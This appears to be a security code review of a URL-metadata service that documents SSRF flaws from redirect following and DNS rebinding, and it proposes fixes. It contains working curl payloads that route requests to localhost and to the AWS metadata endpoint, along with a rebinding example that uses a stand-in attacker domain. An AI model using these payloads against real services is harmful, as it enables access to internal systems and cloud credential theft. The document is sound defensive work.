# SSRF Vulnerability Analysis - Code Review Approach

## Executive Summary
This code review reveals multiple SSRF vulnerabilities in the MetadataSnapshot service. While the application implements several security controls, critical gaps in URL validation and redirect handling allow attackers to access internal network resources.

## Code Review Findings

### Entry Point Analysis

#### File: `src/routes/metadata.js`
Starting our review at the main API endpoints:

```javascript
router.post('/extract', rateLimit, validateUrl, async (req, res) => {
    // ... validation logic
    const metadata = await metadataExtractor.extractMetadata(req.body.url);
```

**Analysis**: The `/extract` endpoint accepts user-provided URLs and passes them to `metadataExtractor.extractMetadata()`. Let's trace this flow.

#### URL Validation Layer

The `validateUrl` middleware in `metadata.js` performs initial validation:

```javascript
const validateUrl = [
    body('url')
        .isURL({ protocols: ['https'], require_protocol: true })
        .withMessage('Only HTTPS URLs are allowed')
        .isLength({ max: 2048 })
        .withMessage('URL too long')
        .trim()
        .escape(),
];
```

**Finding**: This only validates URL format and enforces HTTPS. No validation of destination hosts or internal IP ranges at this layer.

### Core Vulnerability Analysis

#### File: `src/services/metadataExtractor.js`

Following the flow to the main processing function:

```javascript
async extractMetadata(url) {
    if (!this.urlValidator.isValidUrl(url)) {
        throw new Error('URL validation failed - blocked by security policy');
    }

    try {
        const response = await axios.get(url, {
            ...this.axiosConfig,
            responseType: 'text',
            validateStatus: (status) => status >= 200 && status < 400
        });
```

**Critical Finding**: The function calls `urlValidator.isValidUrl()` for validation, then makes the HTTP request with `axios.get()`. However, there's **no validation of the final URL after redirects**.

#### File: `src/services/urlValidator.js`

Examining the URL validation logic:

```javascript
isValidUrl(urlString) {
    try {
        const parsedUrl = new URL.URL(urlString);
        
        // Check protocol blacklist
        if (this.blockedProtocols.includes(parsedUrl.protocol.toLowerCase())) {
            return false;
        }

        const hostname = parsedUrl.hostname.toLowerCase();
        
        // Check domain blacklist
        if (this.blockedDomains.some(domain => hostname.includes(domain))) {
            return false;
        }

        // Check for private IP ranges
        if (this.isPrivateIP(hostname)) {
            return false;
        }
        // ... more checks
    }
}
```

**Key Observations**:
1. ✅ Implements comprehensive blacklists for protocols, domains, and IP ranges
2. ✅ Blocks common internal hosts and cloud metadata endpoints
3. ❌ **Critical Gap**: Only validates the **initial URL**, not the final destination after redirects
4. ❌ **Critical Gap**: No DNS resolution validation - domains can resolve to different IPs over time

## Vulnerability Details & Attack Vectors

### 1. Redirect Chain Bypass (High Severity)

**Root Cause**: In `metadataExtractor.js`, the application validates the initial URL but allows `axios` to follow redirects without re-validating the final destination.

**Attack Flow**:
```
Initial URL: https://httpbin.org/redirect-to?url=http://127.0.0.1:8080
    ↓ (passes urlValidator.isValidUrl())
    ↓ axios.get() follows redirect
Final URL: http://127.0.0.1:8080 (never validated!)
```

**Exploitation**:
```bash
# Bypass localhost restrictions via redirect
curl -X POST http://localhost:3000/api/metadata/extract \
  -H "Content-Type: application/json" \
  -d '{"url": "https://httpbin.org/redirect-to?url=http://127.0.0.1:8080"}'

# Access AWS metadata via redirect
curl -X POST http://localhost:3000/api/metadata/extract \
  -H "Content-Type: application/json" \
  -d '{"url": "https://legitimate-site.com/redirect?target=http://169.254.169.254/latest/meta-data/"}'
```

### 2. DNS Rebinding Attack (High Severity)

**Root Cause**: The `urlValidator.js` doesn't perform DNS resolution validation. It only checks the hostname string, not what IP address it resolves to.

**Attack Flow**:
```
1. Attacker controls DNS for evil-domain.com
2. Initially: evil-domain.com → 1.2.3.4 (public IP, passes validation)
3. DNS TTL expires
4. Later: evil-domain.com → 127.0.0.1 (internal IP, request made here)
```

**Code Analysis**: In `urlValidator.js`, the `isPrivateIP()` function only checks if the hostname itself is an IP:
```javascript
isPrivateIP(hostname) {
    // Check if hostname is an IP address
    if (net.isIP(hostname)) {
        return this.privateIPRanges.some(range => range.test(hostname));
    }
    return false; // ❌ Returns false for domain names!
}
```

**Exploitation**:
```bash
# Set up DNS that changes resolution
# evil-domain.com initially resolves to public IP, then to internal
curl -X POST http://localhost:3000/api/metadata/extract \
  -H "Content-Type: application/json" \
  -d '{"url": "https://evil-domain.com"}'
```

**Code Fix Required**: Resolve DNS and validate the IP addresses:
```javascript
async isValidUrl(url) {
    // ... existing validation
    
    // Resolve DNS and check IPs
    const addresses = await dns.resolve4(hostname);
    const hasPrivateIP = addresses.some(addr => 
        this.privateIPRanges.some(range => range.test(addr))
    );
    if (hasPrivateIP) {
        return false;
    }
}
```

## Impact Assessment

### Accessible Internal Resources
1. **Localhost services**: Development servers, admin panels, APIs
2. **Internal network hosts**: Databases, application servers, monitoring systems  
3. **Cloud metadata services**: AWS/GCP/Azure instance metadata
4. **Container orchestration**: Kubernetes API, Docker daemon
5. **Network infrastructure**: Routers, switches, management interfaces

### Attack Scenarios
1. **Credential theft**: Access cloud metadata for IAM credentials
2. **Service enumeration**: Port scan internal network via timing attacks
3. **Data exfiltration**: Access internal APIs and databases
4. **Privilege escalation**: Access admin interfaces and configuration endpoints
5. **Infrastructure mapping**: Discover internal network topology

## Remediation Recommendations

### Immediate Fixes (High Priority)

1. **Add redirect validation** in `metadataExtractor.js`
2. **Implement DNS resolution checking** in `urlValidator.js`
3. **Enhance IPv6 validation** to cover all localhost representations
4. **Normalize port parsing** to prevent encoding bypasses

### Strategic Improvements (Medium Priority)

1. **Replace blacklists with allowlists** for trusted domains
2. **Implement network-level egress filtering**
3. **Deploy service in isolated network segment**
4. **Add comprehensive logging and monitoring**

### Defense in Depth (Low Priority)

1. **Container sandboxing** with restricted network access
2. **Request signing** for authenticated URL fetching
3. **Content validation** beyond just content-type checking
4. **Rate limiting enhancements** with distributed cache